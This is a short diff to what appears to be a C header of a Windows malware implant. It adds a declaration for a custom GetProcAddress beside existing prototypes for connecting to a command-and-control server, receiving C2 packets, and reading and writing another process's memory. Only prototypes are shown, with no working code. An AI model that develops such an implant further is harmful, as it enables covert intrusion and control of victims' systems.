@@ -39,6 +39,7 @@ BOOL ConnectToC2(SOCKET* c2Socket);
 VOID recvC2Packet(SOCKET* c2Socket, PC2_PACKET receivedPacket);
 int get_process(LPCSTR lpName, PHANDLE hProc, PDWORD PID);
 HMODULE CustomGetModuleHandleW(LPCWSTR moduleName);
+FARPROC CustomGetProcAddress(HMODULE hModule, LPCSTR lpProcName);
 LPCWSTR ConvertDataToLPCWSTR(BYTE* Data);
 BOOL WriteToTargetProcess(IN HANDLE hProcess, IN PVOID pAddressToWriteTo, IN PVOID pBuffer, IN SIZE_T dwBufferSize);
 BOOL ReadFromTargetProcess(IN HANDLE hProcess, IN PVOID pAddress, OUT PVOID* ppReadBuffer, IN SIZE_T dwBufferSize);
